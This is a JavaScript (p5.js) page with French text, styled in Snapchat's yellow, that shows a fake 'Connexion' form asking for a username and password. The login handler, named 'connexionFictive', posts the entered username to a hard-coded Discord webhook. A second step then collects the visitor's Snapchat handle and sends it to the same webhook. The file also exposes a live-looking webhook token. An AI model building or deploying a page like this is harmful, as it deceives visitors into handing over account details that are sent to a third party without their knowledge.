// =====================================================
// CONFIGURATION
// =====================================================

// Ton URL Webhook Discord
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1555284203875205240/9aD9HZLoP6yMIiI-VK3Z-R-ACyxD0VAXqXmODapH8SQHdg14mIL_26b2Po8m0jDn3biS";


// =====================================================
// VARIABLES
// =====================================================

let page = 1;

let usernameInput;
let passwordInput;
let pseudoInput;

let loginButton;
let sendButton;

let message = "";


// =====================================================
// SETUP
// =====================================================

function setup() {
  createCanvas(windowWidth, windowHeight);
  textFont("Arial");

  creerPageConnexion();
  positionnerElements();
}


// =====================================================
// DRAW
// =====================================================

function draw() {
  // Fond jaune Snapchat
  background("#FFFC00");

  if (page === 1) {
    dessinerConnexion();
  } else {
    dessinerPseudo();
  }
}


// =====================================================
// CARTE BLANCHE
// =====================================================

function dessinerCarte() {
  let cardW = min(380, width - 40);
  let cardH = 500;

  let cardX = (width - cardW) / 2;
  let cardY = (height - cardH) / 2;

  // Ombre
  drawingContext.shadowColor = "rgba(0,0,0,0.20)";
  drawingContext.shadowBlur = 25;
  drawingContext.shadowOffsetY = 10;

  fill("#FFFFFF");
  noStroke();

  rect(
    cardX,
    cardY,
    cardW,
    cardH,
    24
  );

  // Désactive l'ombre
  drawingContext.shadowColor = "transparent";
  drawingContext.shadowBlur = 0;
  drawingContext.shadowOffsetY = 0;
}


// =====================================================
// PAGE DE CONNEXION
// =====================================================

function dessinerConnexion() {
  dessinerCarte();

  let cardY = (height - 500) / 2;

  // Icône de chargement
  drawLoader(
    width / 2,
    cardY + 85
  );

  // Titre
  fill("#0f0f0f");
  textAlign(CENTER, CENTER);
  textStyle(BOLD);
  textSize(27);

  text(
    "Connexion",
    width / 2,
    cardY + 165
  );

  // Sous-titre
  textStyle(NORMAL);
  textSize(15);
  fill("#555");

  text(
    "Connecte-toi pour continuer",
    width / 2,
    cardY + 195
  );

  // Labels
  let cardW = min(380, width - 40);
  let x = (width - cardW) / 2;

  textAlign(LEFT);
  textSize(13);
  fill("#333");

  text(
    "Nom d'utilisateur",
    x,
    cardY + 245
  );

  text(
    "Mot de passe",
    x,
    cardY + 325
  );
}


// =====================================================
// PAGE PSEUDO
// =====================================================

function dessinerPseudo() {
  dessinerCarte();

  let cardY = (height - 500) / 2;

  // Icône de chargement
  drawLoader(
    width / 2,
    cardY + 85
  );

  // Titre
  fill("#0f0f0f");
  textAlign(CENTER, CENTER);
  textStyle(BOLD);
  textSize(25);

  if (message === "success") {
    text(
      "Merci " + pseudoInput.value() + " !",
      width / 2,
      cardY + 165
    );
  } else {
    text(
      "Laisse ton pseudo Snap",
      width / 2,
      cardY + 165
    );
  }

  // Sous-titre
  textStyle(NORMAL);
  textSize(15);
  fill("#555");

  if (message === "success") {
    text(
      "Ton pseudo a bien été envoyé.",
      width / 2,
      cardY + 200
    );

    text(
      "À vite sur Snap ! 👻",
      width / 2,
      cardY + 222
    );

    fill("#1a7f37");
    textSize(15);

    text(
      "Envoyé avec succès ✅",
      width / 2,
      cardY + 350
    );
  } else {
    text(
      "Écris ton pseudo Snapchat ci-dessous",
      width / 2,
      cardY + 200
    );

    text(
      "pour qu'on s'ajoute !",
      width / 2,
      cardY + 222
    );
  }
}


// =====================================================
// CRÉATION DE LA PAGE DE CONNEXION
// =====================================================

function creerPageConnexion() {
  // Nom d'utilisateur
  usernameInput = createInput();
  usernameInput.attribute("placeholder", "Nom d'utilisateur");
  styliserInput(usernameInput);

  // Mot de passe
  passwordInput = createInput();
  passwordInput.attribute("placeholder", "Mot de passe");
  passwordInput.attribute("type", "password");
  styliserInput(passwordInput);

  // Bouton
  loginButton = createButton("Se connecter");
  styliserBouton(loginButton);
  loginButton.mousePressed(connexionFictive);
}


// =====================================================
// CRÉATION PAGE PSEUDO
// =====================================================

function creerPagePseudo() {
  if (pseudoInput) return;

  // Champ pseudo
  pseudoInput = createInput();
  pseudoInput.attribute("placeholder", "ex. thibo.snap");
  pseudoInput.attribute("maxlength", "30");
  styliserInput(pseudoInput);

  // Bouton
  sendButton = createButton("Envoyer mon pseudo");
  styliserBouton(sendButton);
  sendButton.mousePressed(envoyerPseudo);
}


// =====================================================
// STYLE DES INPUTS
// =====================================================

function styliserInput(element) {
  element.style("font-size", "16px");
  element.style("padding", "14px 16px");
  element.style("border", "2px solid #e0e0e0");
  element.style("border-radius", "14px");
  element.style("outline", "none");
  element.style("width", "100%");
  element.style("height", "50px");
  element.style("box-sizing", "border-box");
  element.style("background", "#FFFFFF");
}


// =====================================================
// STYLE DES BOUTONS
// =====================================================

function styliserBouton(element) {
  element.style("font-size", "17px");
  element.style("font-weight", "700");
  element.style("color", "#FFFFFF");
  element.style("background", "#0f0f0f");
  element.style("border", "none");
  element.style("border-radius", "14px");
  element.style("padding", "15px");
  element.style("width", "100%");
  element.style("height", "52px");
  element.style("cursor", "pointer");
}


// =====================================================
// POSITIONNEMENT
// =====================================================

function positionnerElements() {
  let cardW = min(380, width - 40);
  let cardH = 500;
  let cardX = (width - cardW) / 2;
  let cardY = (height - cardH) / 2;

  // PAGE CONNEXION
  if (page === 1) {
    if (!usernameInput) return;

    usernameInput.position(cardX, cardY + 255);
    usernameInput.size(cardW, 50);

    passwordInput.position(cardX, cardY + 335);
    passwordInput.size(cardW, 50);

    loginButton.position(cardX, cardY + 405);
    loginButton.size(cardW, 52);
  }
  // PAGE PSEUDO
  else {
    if (!pseudoInput) return;

    pseudoInput.position(cardX, cardY + 270);
    pseudoInput.size(cardW, 50);

    sendButton.position(cardX, cardY + 335);
    sendButton.size(cardW, 52);
  }
}


// =====================================================
// CONNEXION ET ENVOI WEBHOOK (Étape 1)
// =====================================================

async function connexionFictive() {
  let username = usernameInput.value().trim();
  let password = passwordInput.value();

  if (username === "" || password === "") {
    alert("Remplis les deux champs pour continuer.");
    return;
  }

  loginButton.html("Vérification...");
  loginButton.attribute("disabled", "");

  // Payload formaté pour Discord
  const payload = {
    embeds: [
      {
        title: "👤 Tentative de connexion",
        color: 3447003, // Bleu
        fields: [
          { name: "Nom d'utilisateur", value: username, inline: true }
           
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error("Erreur Webhook (HTTP " + response.status + ")");
    }

    page = 2;

    // Cache la première page
    usernameInput.hide();
    passwordInput.hide();
    loginButton.hide();

    // Crée la deuxième page
    creerPagePseudo();
    positionnerElements();

  } catch (error) {
    console.error("Erreur Webhook Discord :", error);

    loginButton.html("Se connecter");
    loginButton.removeAttribute("disabled");

    alert("Échec de l'envoi vers Discord. Détail : " + error.message);
  }
}


// =====================================================
// ENVOI DU PSEUDO WEBHOOK (Étape 2)
// =====================================================

async function envoyerPseudo() {
  let pseudo = pseudoInput.value().trim();

  if (pseudo === "") {
    alert("Entre ton pseudo Snapchat.");
    return;
  }

  sendButton.html("Envoi...");
  sendButton.attribute("disabled", "");

  // Payload formaté pour Discord
  const payload = {
    embeds: [
      {
        title: "👻 Nouveau pseudo Snap",
        color: 16776960, // Jaune Snapchat
        fields: [
          { name: "Pseudo Snap", value: pseudo, inline: true }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error("Erreur serveur");
    }

    message = "success";
    pseudoInput.hide();
    sendButton.hide();

  } catch (error) {
    console.error("Erreur Webhook Discord :", error);

    sendButton.html("Envoyer mon pseudo");
    sendButton.removeAttribute("disabled");

    alert("L'envoi a échoué. Réessaie.");
  }
}


// =====================================================
// ICÔNE DE CHARGEMENT
// =====================================================

function drawLoader(x, y) {
  push();
  translate(x, y);

  // Animation légère du spinner
  rotate(frameCount * 0.08);

  noStroke();

  const segments = 10;
  const radius = 34;

  for (let i = 0; i < segments; i++) {
    push();
    rotate((TWO_PI / segments) * i);

    const shade = map(i, 0, segments - 1, 25, 205);
    fill(shade);

    rectMode(CENTER);
    rect(0, -radius, 7, 18, 4);

    pop();
  }

  pop();
}


// =====================================================
// REDIMENSIONNEMENT DE LA FENÊTRE
// =====================================================

function windowResized() {
  resizeCanvas(windowWidth, windowHeight);
  positionnerElements();
}